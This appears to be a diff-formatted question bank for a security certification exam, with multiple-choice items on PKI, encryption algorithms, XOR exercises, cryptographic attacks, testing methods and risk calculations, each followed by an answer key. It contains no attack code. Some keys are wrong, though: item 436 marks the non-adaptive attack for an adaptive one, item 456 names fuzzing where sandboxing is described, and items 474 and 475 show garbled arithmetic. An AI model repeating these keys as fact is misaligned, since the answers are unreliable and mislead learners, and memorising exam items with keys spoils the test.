+C. RSA 512 bit strength
+D. AES 512 bit strength
+","A
+",409
+"411. Which of the following defines the role of a root Certificate Authority (CA) in a Public Key Infrastructure (PKI)?
+A. The root CA is the recovery agent used to encrypt data when a user’s certificate is lost.
+B. The root CA stores the user’s hash value for safekeeping.
+C. The root CA is the trusted root that issues certificates.
+D. The root CA is used to encrypt email messages to prevent unintended disclosure of data.
+","C
+",411
+"412. Company A and Company B have just merged and each has its own Public Key Infrastructure (PKI). What must the Certificate Authorities (CAs) establish so that the private PKIs for Company A and Company B trust one another and each private PKI can validate digital certificates from the other company?
+A. Poly key exchange
+B. Cross certification
+C. Poly key reference
+D. Cross-site exchange
+","B
+",412
+"413. Which element of Public Key Infrastructure (PKI) verifies the applicant?
+A. Certificate authority
+B. Validation authority
+C. Registration authority
+D. Verification authority
+","C
+",413
+"414. A Certificate Authority (CA) generates a key pair that will be used for encryption and decryption of email. The integrity of the encrypted email is dependent on the security of which of the following?
+A. Public key
+B. Private key
+C. Modulus length
+D. Email server certificate
+","B
+",414
+"415. A network security administrator is worried about potential man-in-the-middle attacks when users access a corporate web site from their workstations. Which of the following is the best remediation against this type of attack?
+A. Implementing server-side PKI certificates for all connections
+B. Mandating only client-side PKI certificates for all connections
+C. Requiring client and server PKI certificates for all connections
+D. Requiring strong authentication for all DNS queries
+","C
+",415
+"416. Which of the following describes a component of Public Key Infrastructure (PKI) where a copy of a private key is stored to provide third-party access and to facilitate recovery operations?
+A. Key registry
+B. Recovery agent
+C. Directory
+D. Key escrow
+","D
+",416
+"417. Which of the following processes of PKI (Public Key Infrastructure) ensures that a trust relationship exists and that a certificate is still valid for specific operations?
+A. Certificate issuance
+B. Certificate validation
+C. Certificate cryptography
+D. Certificate revocation
+","B
+",417
+"418. XOR is a common cryptographic tool. 10110001 XOR 00111010 is?
+A. 10111100
+B. 11011000
+C. 10011101
+D. 10001011
+","D
+",418
+"419. A hacker was able to sniff packets on a company’s wireless network. The following information was discovered:
+The Key 10110010 01001011
+The Cyphertext 01100101 01011010
+Using the Exclusive OR, what was the original message?
+A. 00101000 11101110
+B. 11010111 00010001
+C. 00001101 10100100
+D. 11110010 01011011
+","B
+",419
+"420. The network administrator for a company is setting up a website with e-commerce capabilities. Packet sniffing is a concern because credit card information will be sent electronically over the Internet. Customers visiting the site will need to encrypt the data with HTTPS. Which type of certificate is used to encrypt and decrypt the data?
+A. Asymmetric
+B. Confidential
+C. Symmetric
+D. Non-confidential
+","A
+",420
+"421. What is the difference between the AES and RSA algorithms?
+A. Both are asymmetric algorithms, but RSA uses 1024-bit keys.
+B. RSA is asymmetric, which is used to create a public/private key pair; AES is symmetric, which is used to encrypt data.
+C. Both are symmetric algorithms, but AES uses 256-bit keys.
+D. AES is asymmetric, which is used to create a public/private key pair; RSA is symmetric, which is used to encrypt data.
+","B
+",421
+"422. What is the primary drawback to using advanced encryption standard (AES) algorithm with a 256 bit key to share sensitive data?
+A. Due to the key size, the time it will take to encrypt and decrypt the message hinders efficient communication.
+B. To get messaging programs to function with this algorithm requires complex configurations.
+C. It has been proven to be a weak cipher; therefore, should not be trusted to protect sensitive data.
+D. It is a symmetric key algorithm, meaning each recipient must receive the key through a different channel than the message.
+","D
+",422
+"423. The fundamental difference between symmetric and asymmetric key cryptographic systems is that symmetric key cryptography uses which of the following?
+A. Multiple keys for non-repudiation of bulk data
+B. Different keys on both ends of the transport medium
+C. Bulk encryption for data transmission over fiber
+D. The same key on each end of the transmission medium
+","D
+",423
+"424. Which of the following is an example of an asymmetric encryption implementation?
+A. SHA1
+B. PGP
+C. 3DES
+D. MD5
+","B
+",424
+"425. A person approaches a network administrator and wants advice on how to send encrypted email from home. The end user does not want to have to pay for any license fees or manage server services. Which of the following is the most secure encryption protocol that the network administrator should recommend?
+A. IP Security (IPSEC)
+B. Multipurpose Internet Mail Extensions (MIME)
+C. Pretty Good Privacy (PGP)
+D. Hyper Text Transfer Protocol with Secure Socket Layer (HTTPS)
+","C
+",425
+"426. To send a PGP encrypted message, which piece of information from the recipient must the sender have before encrypting the message?
+A. Recipient’s private key
+B. Recipient’s public key
+C. Master encryption key
+D. Sender’s public key
+","B
+",426
+"427. Which of the following areas is considered a strength of symmetric key cryptography when compared with asymmetric algorithms?
+A. Scalability
+B. Speed
+C. Key distribution
+D. Security
+","B
+",427
+"428. In which of the following password protection technique, random strings of characters are added to the password before calculating their hashes
+Keyed Hashing
+Double Hashing
+Salting
+Key Stretching
+","Salting
+",428
+"429. This asymmetry cipher is based on factoring the product of two large prime numbers.
+What cipher is described above?
+A. RSA
+B. SHA
+C. RC5
+D. MD5
+","A
+",429
+"430. During the process of encryption and decryption, what keys are shared?
+Public keys
+Public and private keys
+Private keys
+User passwords
+","Public keys
+",430
+"431. Which of the following Secure Hashing Algorithm (SHA) provides better protection against brute force attacks by producing a 160-bit digest from a message with a maximum length of (264 – 1) bits and resembles the MD5 algorithm?
+SHA-0
+SHA-2
+SHA-1
+SHA-3
+","SHA-1
+",431
+"432. After gaining access to the password hashes used to protect access to a web based application, knowledge of which cryptographic algorithms would be useful to gain access to the application?
+A. SHA1
+B. Diffie-Helman
+C. RSA
+D. AES
+","A
+",432
+"433. Diffie-Hellman (DH) groups determine the strength of the key used in the key exchange process. Which of the following is the correct bit size of the Diffie-Hellman (DH) group 5?
+A. 768 bit key
+B. 1025 bit key
+C. 1536 bit key
+D. 2048 bit key
+","C
+",433
+"436. In which of the following cryptography attack methods, the attacker makes a series of interactive queries, choosing subsequent plaintexts based on the information from the previous encryptions?
+Adaptive chosen-plaintext attack
+Known-plaintext attack
+Chosen-plaintext attack
+Ciphertext-only attack
+","Chosen-plaintext attack
+",436
+"437. An attacker sniffs encrypted traffic from the network and is subsequently able to decrypt it. The attacker can now use which cryptanalytic technique to attempt to discover the encryption key?
+A. Birthday attack
+B. Plaintext attack
+C. Meet in the middle attack
+D. Chosen ciphertext attack
+","D
+",437
+"438. Which of the following cryptography attack is an understatement for the extraction of cryptographic secrets (e.g. the password to an encrypted file) from a person by coercion or torture?
+Ciphertext-only Attack
+Rubber Hose Attack
+Chosen-Cipher text Attack
+Timing Attack
+","Rubber Hose Attack
+",438
+"439. Which of the following cryptography attack methods is usually performed without the use of a computer?
+A. Ciphertext-only attack
+B. Chosen key attack
+C. Rubber hose attack
+D. Rainbow table attack
+","C
+",439
+"440. What is correct about digital signatures?
+A. A digital signature cannot be moved from one signed document to another because it is the hash of the original document encrypted with the private key of the signing party.
+B. Digital signatures may be used in different documents of the same type.
+C. A digital signature cannot be moved from one signed document to another because it is a plain hash of the document content.
+D. Digital signatures are issued once for each user and can be used everywhere until they expire.
+","A
+",440
+"441. What two conditions must a digital signature meet?
+Must be unique and have special characters.
+Has to be legible and neat.
+Has to be unforgeable, and has to be authentic.
+Has to be the same number of characters as a physical signature and must be unique.
+","Has to be unforgeable, and has to be authentic.
+",441
+"442. Cryptography is the practice and study of techniques for secure communication in the presence of third parties (called adversaries). More generally, it is about constructing and analyzing protocols that overcome the influence of adversaries and that are related to various aspects in information security such as data confidentiality, data integrity, authentication, and non-repudiation. Modern cryptography intersects the disciplines of mathematics, computer science, and electrical engineering. Applications of cryptography include ATM cards, computer passwords, and electronic commerce.
+Basic example to understand how cryptography works is given below:
+SECURE (plain text)
++1 (+1 next letter. for example, the letter “”T”” is used for “”S”” to encrypt.)
+TFDVSF (encrypted text)
++ = logic => Algorithm
+1 = Factor => Key
+Which of the following choices true about cryptography?
+Algorithm is not the secret, key is the secret.
+Public-key cryptography, also known as asymmetric cryptography, public key is for decrypt, private key is for encrypt.
+Symmetric-key algorithms are a class of algorithms for cryptography that use the different cryptographic keys for both encryption of plaintext and decryption of ciphertext
+Secure Sockets Layer (SSL) use the asymmetric encryption both (public/private key pair) to deliver the shared session key and to achieve a communication way.
+","Secure Sockets Layer (SSL) use the asymmetric encryption both (public/private key pair) to deliver the shared session key and to achieve a communication way.
+",442
+"443. Some passwords are stored using specialized encryption algorithms known as hashes. Why is this an appropriate method?
+A. It is impossible to crack hashed user passwords unless the key used to encrypt them is obtained.
+B. If a user forgets the password, it can be easily retrieved using the hash key stored by administrators.
+C. Hashing is faster compared to more traditional encryption algorithms.
+D. Passwords stored using hashes are non-reversible, making finding the password much more difficult.
+","D
+",443
+"444. For messages sent through an insecure channel, a properly implemented digital signature gives the receiver reason to believe the message was sent by the claimed sender. While using a digital signature, the message digest is encrypted with which key?
+A. Sender’s public key
+B. Receiver’s private key
+C. Receiver’s public key
+D. Sender’s private key
+","D
+",444
+"445. When setting up a wireless network, an administrator enters a pre-shared key for security. Which of the following is true?
+A. The key entered is a symmetric key used to encrypt the wireless data.
+B. The key entered is a hash that is used to prove the integrity of the wireless data.
+C. The key entered is based on the Diffie-Hellman method.
+D. The key is an RSA key used to encrypt the wireless data.
+","A
+",445
+"446. You need to deploy a new web-based software package for your organization. The package requires three separate servers and needs to be available on the Internet. 
+What is the recommended architecture in terms of server placement?
+Ans: A web server facing the Internet, an application server on the internal network, a database server on the internal network
+","A web server facing the Internet, an application server on the internal network, a database server on the internal network
+",446
+"447. In the software security development life cycle process, threat modeling occurs in which phase?
+A. Design
+B. Requirements
+C. Verification
+D. Implementation
+","A
+",447
+"448. What is the main disadvantage of the scripting languages as opposed to compiled programming languages?
+A. Scripting languages are hard to learn.
+B. Scripting languages are not object-oriented.
+C. Scripting languages cannot be used to create graphical user interfaces.
+D. Scripting languages are slower because they require an interpreter to run the code.
+","D
+",448
+"449. What is the role of test automation in security testing?
+It can accelerate benchmark tests and repeat them with a consistent test setup. But it cannot replace manual testing completely.
+Test automation is not usable in security due to the complexity of the tests
+It should be used exclusively. Manual testing is outdated because of low speed and possible test setup inconsistencies
+It is an option but it tends to be very expensive
+","It can accelerate benchmark tests and repeat them with a consistent test setup. But it cannot replace manual testing completely.
+",449
+"450. Which of the following is a design pattern based on distinct pieces of software providing application functionality as services to other applications?
+A. Service Oriented Architecture
+B. Object Oriented Architecture
+C. Lean Coding
+D. Agile Process
+","A
+",450
+"451. Which of the following is a common Service Oriented Architecture (SOA) vulnerability?
+A. Cross-site scripting
+B. SQL injection
+C. VPath injection
+D. XML denial of service issues
+","D
+",451
+"452. Websites and web portals that provide web services commonly use the Simple Object Access Protocol (SOAP). Which of the following is an incorrect definition or characteristics of the protocol?
+Based on XML
+Provides a structured model for messaging
+Exchanges data between web services
+Only compatible with the application protocol HTTP
+","Only compatible with the application protocol HTTP
+",452
+"454. A software tester is randomly generating invalid inputs in an attempt to crash the program. Which of the following is a software testing technique used to determine if a software program properly handles a wide range of invalid input?
+A. Mutating
+B. Randomizing
+C. Fuzzing
+D. Bounding
+","C
+",454
+"455. Which of the following is an adaptive SQL injection testing technique used to discover coding errors by inputting massive amounts of random data and observing the changes in the output?
+Dynamic Testing (Analyze dynamic code behavior)
+Function Testing (QA, Black box based on software specifications)
+Fuzzing Testing
+Static Testing (Review, Walkthrough without executing code)
+","Fuzzing Testing
+",455
+"456. Sid is a judge for a programming contest. Before the code reaches him it goes through a restricted OS and is tested there. If it passes, then it moves onto Sid. 
+What is this middle step called?
+Third party running the code
+Fuzzy-testing the code
+String validating the code
+Sandboxing the code
+","Fuzzy-testing the code
+",456
+"457. Which of the following is a restriction being enforced in “white box testing?”
+A. Only the internal operation of a system is known to the tester
+B. The internal operation of a system is completely known to the tester
+C. The internal operation of a system is only partly accessible to the tester
+D. Only the external operation of a system is accessible to the tester
+","B
+",457
+"458. The “gray box testing” methodology enforces what kind of restriction?
+A. The internal operation of a system is only partly accessible to the tester.
+B. The internal operation of a system is completely known to the tester.
+C. Only the external operation of a system is accessible to the tester.
+D. Only the internal operation of a system is known to the tester.
+","A
+",458
+"459. The “black box testing” methodology enforces what kind of restriction?
+A. The internal operation of a system is only partly accessible to the tester.
+B. The internal operation of a system is completely known to the tester.
+C. Only the external operation of a system is accessible to the tester.
+D. Only the internal operation of a system is known to the tester.
+","C
+",459
+"460. A penetration tester is hired to do a risk assessment of a company’s DMZ. The rules of engagement states that the penetration test be done from an external IP address with no prior knowledge of the internal IT systems.
+What kind of test is being performed?
+A. white box
+B. grey box
+C. red box
+D. black box
+","D
+",460
+"461. What type of analysis is performed when an attacker has partial knowledge of inner-workings of the application?
+Black-box
+Announced
+Grey-box
+White-box
+","Grey-box
+",461
+"462. Seth is starting a penetration test from inside the network. He hasn’t been given any information about the network. What type of test is he conducting?
+Internal, Whitebox
+Internal, Blackbox
+External,Blackbox
+External, Whitebox
+","Internal, Blackbox
+",462
+"463. Risks = Threats x Vulnerabilities is referred to as the:
+A. Risk equation
+B. Threat assessment
+C. BIA equation
+D. Disaster recovery formula
+","A
+",463
+"464. In Risk Management, how is the term “likelihood” related to the concept of “threat?”
+A. Likelihood is the probability that a threat-source will exploit a vulnerability.
+B. Likelihood is a possible threat-source that may exploit a vulnerability.
+C. Likelihood is the likely source of a threat that could exploit a vulnerability.
+D. Likelihood is the probability that a vulnerability is a threat-source.
+","A
+",464
+"465. What kind of risk will remain even if all theoretically possible safety measures would be applied?
+A. Residual risk
+B. Inherent risk
+C. Impact risk
+D. Deferred risk
+","A
+",465
+"466. If the final set of security controls does not eliminate all risk in a system, what could be done next?
+A. Continue to apply controls until there is zero risk.
+B. Ignore any remaining risk.
+C. If the residual risk is low enough, it can be accepted.
+D. Remove current controls since they are not completely effective.
+","C
+",466
+"467. One of the Forbes 500 companies has been subjected to a large scale attack. You are one of the shortlisted pen testers that they may hire. During the interview with the CIO, he emphasized that he wants to totally eliminate all risks. What is one of the first things you should do when hired?
+A. Interview all employees in the company to rule out possible insider threats.
+B. Establish attribution to suspected attackers.
+C. Explain to the CIO that you cannot eliminate all risk, but you will be able to reduce risk to acceptable levels.
+D. Start the Wireshark application to start sniffing network traffic.
+","C
+",467
+"468. What information should an IT system analysis provide to the risk assessor?
+A. Management buy-in
+B. Threat statement
+C. Security architecture
+D. Impact analysis
+","C
+",468
+"469. The practical realities facing organizations today make risk response strategies essential. Which of the following is NOT one of the five basic responses to risk?
+A. Accept
+B. Mitigate
+C. Delegate
+D. Avoid
+","C
+",469
+"470. Which of the following is considered an acceptable option when managing a risk?
+A. Reject the risk.
+B. Deny the risk.
+C. Mitigate the risk.
+D. Initiate the risk.
+","C
+",470
+"471. Which of the following is a component of a risk assessment?
+A. Administrative safeguards
+B. Physical security
+C. DMZ
+D. Logical interface
+","A
+",471
+"472. On performing a risk assessment, you need to determine the potential impacts when some of the critical business processes of the company interrupt its service. 
+What is the name of the process by which you can determine those critical businesses?
+Business Impact Analysis (BIA)
+Disaster Recovery Planning (DRP)
+Emergency Plan Response (EPR)
+Risk Mitigation
+","Business Impact Analysis (BIA)
+",472
+"473. Which of the following lists are valid data-gathering activities associated with a risk assessment?
+A. Threat identification, vulnerability identification, control analysis
+B. Threat identification, response identification, mitigation identification
+C. Attack profile, defense profile, loss profile
+D. System profile, vulnerability identification, security determination
+","A
+",473
+"474. The chance of a hard drive failure is known to be once every four years. The cost of a new hard drive is $500. EF (Exposure Factor) is about 0.5. Calculate for the Annualized Loss Expectancy (ALE).
+A. $62.5
+B. $250
+C. $125
+D. $65.2
+4/0.5=8 500/8=62.6
+","A
+",474
+"475. What is the approximate cost of replacement and recovery operation per year of a hard drive that has a value of $300 given that the technician who charges $10/hr would need 10 hours to restore OS and Software and needs further 4 hours to restore the database from the last backup to the new hard disk? Calculate the SLE, ARO, and ALE. Assume the EF = 1 (100%).
+A. $440
+B. $100
+C. $1320
+D. $146
+","D Explanation: The annualized loss expectancy (ALE) is the product of the annual rate of occurrence (ARO) and the single loss expectancy (SLE).Suppose than an asset is valued at $100,000, and the Exposure Factor (EF) for this asset is 25%. The single loss expectancy (SLE) then, is 25% * $100,000, or $25,000. In our example the ARO is 33%, and the SLE is 300+14*10 (as EF=1). The ALO is thus: 33%*(300+14*10) which equals 146.
+",475
+"476. Which tier in the N-tier application architecture is responsible for moving and processing data between the tiers?
+Data tier
+Presentation tier
+Logic tier
+Application Layer
+","Logic tier
+",476
+"477. Which statement best describes a server type under an N-tier architecture?
+A. A group of servers at a specific layer
+B. A single server with a specific role
+C. A group of servers with a unique role
+D. A single server at a specific layer
+","C
+",477
+"478. Which of the following items is unique to the N-tier architecture method of designing software applications?
+A. Application layers can be separated, allowing each layer to be upgraded independently from other layers.
+B. It is compatible with various databases including Access, Oracle, and SQL.
+C. Data security is tied into each layer and must be updated for all layers when any upgrade is performed.
+D. Application layers can be written in C, ASP.NET, or Delphi without any performance loss.
+","A
+",478
+"479. What is the benefit of performing an unannounced Penetration Testing?
+A. The tester will have an actual security posture visibility of the target network.
+B. Network security would be in a “best state” posture.
+C. It is best to catch critical infrastructure unpatched.
+D. The tester could not provide an honest analysis.
+","A
+",479
+"480. Which method can provide a better return on IT security investment and provide a thorough and comprehensive assessment of organizational security covering policy, procedure design, and implementation?
+A. Penetration testing
+B. Social engineering
+C. Vulnerability scanning
+D. Access control list reviews",A,480
